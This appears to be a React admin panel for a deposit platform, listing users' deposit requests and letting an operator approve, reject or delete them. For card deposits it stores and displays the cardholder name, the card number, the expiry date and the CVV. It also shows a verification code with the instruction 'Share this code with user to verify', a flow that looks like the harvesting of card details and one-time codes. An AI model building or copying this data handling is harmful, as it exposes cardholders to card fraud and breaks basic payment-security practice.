import { useState, useEffect } from 'react';
import { Check, X, Eye, Trash2 } from 'lucide-react';
import { fetchAllDeposits, completeDeposit, rejectDeposit } from '../../services/transactions';
import { supabase } from '../../services/auth';

interface DepositRequest {
  id: string;
  user_id: string;
  deposit_method: 'card' | 'transfer' | 'crypto';
  amount: number;
  card_last_digits?: string;
  cardholder_name?: string;
  card_number_encrypted?: string;
  card_expiry?: string;
  cvv_encrypted?: string;
  verification_code?: string;
  payment_slip_url?: string;
  status: 'pending' | 'code_sent' | 'code_verified' | 'completed' | 'rejected';
  created_at: string;
  updated_at: string;
  users?: {
    email: string;
  };
}

export default function DepositManagement() {
  const [deposits, setDeposits] = useState<DepositRequest[]>([]);
  const [loading, setLoading] = useState(true);
  const [selectedDeposit, setSelectedDeposit] = useState<DepositRequest | null>(null);
  const [showModal, setShowModal] = useState(false);

  useEffect(() => {
    loadDeposits();
  }, []);

  const loadDeposits = async () => {
    try {
      setLoading(true);
      const data = await fetchAllDeposits();
      setDeposits(data);
    } catch (err) {
      console.error('Error loading deposits:', err);
    } finally {
      setLoading(false);
    }
  };

  const handleApprove = async (depositId: string) => {
    try {
      await completeDeposit(depositId);
      setDeposits(deposits.map(d => d.id === depositId ? { ...d, status: 'completed' } : d));
      alert('Deposit approved and balance updated!');
    } catch (err) {
      alert('Error approving deposit');
    }
  };

  const handleReject = async (depositId: string) => {
    try {
      await rejectDeposit(depositId);
      setDeposits(deposits.map(d => d.id === depositId ? { ...d, status: 'rejected' } : d));
      alert('Deposit rejected');
    } catch (err) {
      alert('Error rejecting deposit');
    }
  };

  const handleDelete = async (depositId: string) => {
    if (!window.confirm('Are you sure you want to delete this deposit request?')) {
      return;
    }

    try {
      const { error } = await supabase
        .from('deposit_requests')
        .delete()
        .eq('id', depositId);

      if (error) throw error;

      setDeposits(deposits.filter(d => d.id !== depositId));
      setShowModal(false);
      alert('Deposit request deleted');
    } catch (err) {
      console.error('Error deleting deposit:', err);
      alert('Error deleting deposit');
    }
  };

  const getStatusColor = (status: string) => {
    switch (status) {
      case 'pending':
        return 'bg-yellow-500/20 text-yellow-400';
      case 'code_sent':
        return 'bg-blue-500/20 text-blue-400';
      case 'code_verified':
        return 'bg-orange-500/20 text-orange-400';
      case 'completed':
        return 'bg-green-500/20 text-green-400';
      case 'rejected':
        return 'bg-red-500/20 text-red-400';
      default:
        return 'bg-gray-500/20 text-gray-400';
    }
  };

  if (loading) {
    return <div className="text-white">Loading deposits...</div>;
  }

  return (
    <div className="bg-gray-800 rounded-xl p-6">
      <h2 className="text-2xl font-bold text-white mb-6">Deposit Requests Management</h2>

      <div className="overflow-x-auto">
        <table className="w-full">
          <thead>
            <tr className="border-b border-gray-700 text-left">
              <th className="px-4 py-3 text-gray-300 font-semibold">User Email</th>
              <th className="px-4 py-3 text-gray-300 font-semibold">Method</th>
              <th className="px-4 py-3 text-gray-300 font-semibold">Amount</th>
              <th className="px-4 py-3 text-gray-300 font-semibold">Status</th>
              <th className="px-4 py-3 text-gray-300 font-semibold">Details</th>
              <th className="px-4 py-3 text-gray-300 font-semibold">Actions</th>
            </tr>
          </thead>
          <tbody>
            {deposits.map((deposit) => (
              <tr key={deposit.id} className="border-b border-gray-700 hover:bg-gray-700/50">
                <td className="px-4 py-3 text-white">{deposit.users?.email || 'Unknown'}</td>
                <td className="px-4 py-3 text-white">
                  <span className="capitalize px-2 py-1 bg-gray-700 rounded text-sm">
                    {deposit.deposit_method}
                  </span>
                </td>
                <td className="px-4 py-3 text-white font-semibold">${deposit.amount.toFixed(2)}</td>
                <td className="px-4 py-3">
                  <span className={`px-3 py-1 rounded-full text-sm font-semibold ${getStatusColor(deposit.status)}`}>
                    {deposit.status.replace('_', ' ')}
                  </span>
                </td>
                <td className="px-4 py-3 text-white text-sm">
                  {deposit.deposit_method === 'card' && (
                    <div>
                      <div>Card: ****{deposit.card_last_digits}</div>
                      <div className="text-gray-400 text-xs">Code: {deposit.verification_code}</div>
                    </div>
                  )}
                  {deposit.deposit_method === 'transfer' && (
                    <div>
                      {deposit.payment_slip_url ? (
                        <a href={deposit.payment_slip_url} target="_blank" rel="noopener noreferrer" className="text-blue-400 hover:underline">
                          View Slip
                        </a>
                      ) : (
                        <span className="text-gray-400">No slip uploaded</span>
                      )}
                    </div>
                  )}
                  {deposit.deposit_method === 'crypto' && (
                    <div className="text-gray-400">Crypto deposit</div>
                  )}
                </td>
                <td className="px-4 py-3 space-x-2 flex">
                  <button
                    onClick={() => {
                      setSelectedDeposit(deposit);
                      setShowModal(true);
                    }}
                    className="p-2 bg-blue-500/20 text-blue-400 rounded hover:bg-blue-500/40 transition-colors"
                    title="View Details"
                  >
                    <Eye className="h-4 w-4" />
                  </button>
                  {(deposit.status === 'code_verified' || deposit.status === 'pending') && (
                    <>
                      <button
                        onClick={() => handleApprove(deposit.id)}
                        className="p-2 bg-green-500/20 text-green-400 rounded hover:bg-green-500/40 transition-colors"
                        title="Approve"
                      >
                        <Check className="h-4 w-4" />
                      </button>
                      <button
                        onClick={() => handleReject(deposit.id)}
                        className="p-2 bg-red-500/20 text-red-400 rounded hover:bg-red-500/40 transition-colors"
                        title="Reject"
                      >
                        <X className="h-4 w-4" />
                      </button>
                    </>
                  )}
                </td>
              </tr>
            ))}
          </tbody>
        </table>
      </div>

      {deposits.length === 0 && (
        <div className="text-center py-8 text-gray-400">
          No deposit requests found
        </div>
      )}

      {/* Detail Modal */}
      {showModal && selectedDeposit && (
        <div className="fixed inset-0 bg-black/50 flex items-center justify-center z-50">
          <div className="bg-gray-800 rounded-lg p-6 max-w-md w-full mx-4 max-h-screen overflow-y-auto">
            <h3 className="text-xl font-bold text-white mb-4">Deposit Details</h3>
            <div className="space-y-3 text-gray-300 mb-6">
              <div className="bg-gray-900 p-3 rounded-lg">
                <p className="text-sm text-gray-400 mb-1">User Email</p>
                <p className="font-semibold text-white">{selectedDeposit.users?.email}</p>
              </div>

              <div className="grid grid-cols-2 gap-3">
                <div className="bg-gray-900 p-3 rounded-lg">
                  <p className="text-sm text-gray-400 mb-1">Method</p>
                  <p className="font-semibold text-white capitalize">{selectedDeposit.deposit_method}</p>
                </div>
                <div className="bg-gray-900 p-3 rounded-lg">
                  <p className="text-sm text-gray-400 mb-1">Amount</p>
                  <p className="font-semibold text-white">${selectedDeposit.amount.toFixed(2)}</p>
                </div>
              </div>

              <div className="bg-gray-900 p-3 rounded-lg">
                <p className="text-sm text-gray-400 mb-1">Status</p>
                <p className={`px-2 py-1 rounded text-sm font-semibold w-fit ${getStatusColor(selectedDeposit.status)}`}>
                  {selectedDeposit.status.replace('_', ' ')}
                </p>
              </div>
              
              {selectedDeposit.deposit_method === 'card' && (
                <>
                  <div className="bg-blue-500/10 border border-blue-500 rounded-lg p-3">
                    <p className="text-sm text-blue-400 font-semibold mb-3">💳 Card Details</p>
                    <div className="space-y-2 text-sm">
                      <div className="flex justify-between items-center">
                        <span className="text-gray-400">Cardholder:</span>
                        <span className="font-semibold text-white">{selectedDeposit.cardholder_name}</span>
                      </div>
                      <div className="flex justify-between items-center">
                        <span className="text-gray-400">Card Number:</span>
                        <span className="font-mono font-semibold text-white">{selectedDeposit.card_number_encrypted ? '••••••••••••' + selectedDeposit.card_number_encrypted : '****' + selectedDeposit.card_last_digits}</span>
                      </div>
                      <div className="flex justify-between items-center">
                        <span className="text-gray-400">Expiry Date:</span>
                        <span className="font-semibold text-white">{selectedDeposit.card_expiry || 'N/A'}</span>
                      </div>
                      <div className="flex justify-between items-center">
                        <span className="text-gray-400">CVV:</span>
                        <span className="font-mono font-semibold text-white">•••{selectedDeposit.cvv_encrypted || ''}</span>
                      </div>
                    </div>
                  </div>

                  <div className="bg-purple-500/10 border border-purple-500 rounded-lg p-3">
                    <p className="text-sm text-purple-400 font-semibold mb-2">🔐 Verification Code</p>
                    <p className="text-center text-2xl font-mono font-bold text-purple-300">{selectedDeposit.verification_code}</p>
                    <p className="text-xs text-gray-400 mt-2 text-center">Share this code with user to verify</p>
                  </div>
                </>
              )}
              
              {selectedDeposit.deposit_method === 'transfer' && selectedDeposit.payment_slip_url && (
                <>
                  <p><span className="font-semibold">Payment Slip:</span></p>
                  <div className="mt-2 mb-4 border border-gray-600 rounded-lg overflow-hidden bg-black/30">
                    {selectedDeposit.payment_slip_url.includes('.pdf') ? (
                      <a href={selectedDeposit.payment_slip_url} target="_blank" rel="noopener noreferrer" className="text-blue-400 hover:underline block p-4">
                        📄 Open PDF Document
                      </a>
                    ) : (
                      <img src={selectedDeposit.payment_slip_url} alt="Payment Slip" className="w-full max-h-64 object-contain" />
                    )}
                  </div>
                  <a href={selectedDeposit.payment_slip_url} target="_blank" rel="noopener noreferrer" className="text-blue-400 hover:underline break-all text-sm">
                    {selectedDeposit.payment_slip_url}
                  </a>
                </>
              )}
              
              <p className="text-xs text-gray-500"><span className="font-semibold">Created:</span> {new Date(selectedDeposit.created_at).toLocaleString()}</p>
            </div>

            {/* Action Buttons */}
            <div className="space-y-2 mb-4">
              {(selectedDeposit.status === 'code_verified' || selectedDeposit.status === 'pending' || selectedDeposit.status === 'code_sent') && (
                <>
                  <button
                    onClick={() => {
                      handleApprove(selectedDeposit.id);
                      setShowModal(false);
                    }}
                    className="w-full bg-green-500 hover:bg-green-600 text-white font-semibold py-2 rounded transition-colors flex items-center justify-center gap-2"
                  >
                    <Check className="h-4 w-4" /> Approve Deposit
                  </button>
                  <button
                    onClick={() => {
                      handleReject(selectedDeposit.id);
                      setShowModal(false);
                    }}
                    className="w-full bg-red-500 hover:bg-red-600 text-white font-semibold py-2 rounded transition-colors flex items-center justify-center gap-2"
                  >
                    <X className="h-4 w-4" /> Reject Deposit
                  </button>
                </>
              )}
              <button
                onClick={() => handleDelete(selectedDeposit.id)}
                className="w-full bg-gray-700 hover:bg-gray-600 text-white font-semibold py-2 rounded transition-colors flex items-center justify-center gap-2"
              >
                <Trash2 className="h-4 w-4" /> Delete Request
              </button>
            </div>

            <button
              onClick={() => setShowModal(false)}
              className="w-full bg-gray-600 hover:bg-gray-700 text-white py-2 rounded transition-colors"
            >
              Close
            </button>
          </div>
        </div>
      )}
    </div>
  );
}
